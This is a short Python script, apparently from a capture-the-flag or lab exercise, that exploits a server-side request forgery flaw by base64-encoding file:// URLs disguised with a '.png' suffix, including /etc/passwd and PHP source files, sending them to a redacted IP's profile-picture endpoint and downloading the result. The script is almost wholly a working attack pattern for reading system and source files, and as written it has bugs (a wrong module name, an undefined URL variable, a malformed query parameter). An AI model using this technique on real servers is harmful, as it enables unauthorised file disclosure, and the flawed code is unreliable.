import request, base64

#ssrf_url = b'file:///var/www/administration.php?.png'
#ssrf_url = b'file:///var/www/register?.png'
#ssrf_url = b'file:///var/www/main.php?.png'
#ssrf_url = b'file:///var/www/login.php?.png'
#ssrf_url = b'file:///etc/passwd?.png'


encoded = base64.b64encode(ssrf_url)
encoded = str(encoded)
encoded = encoded[1:].strip("'")

print('URL in ASCII: ' + str(ssrf_url))
print('URL in base64: ' + encoded)

full_request = "http://**.205.**.**/testProfilePng?u" + encoded
print("URL to execute file on server:")
print(full_request)

session = request.session()
res = session.get(full_request)
file_name = res.json()
file_name = file_name['png']
print(res.text)

url = "http://**.205.**.**/profilePics/" + file_name
print('Downloading from: ' + url)


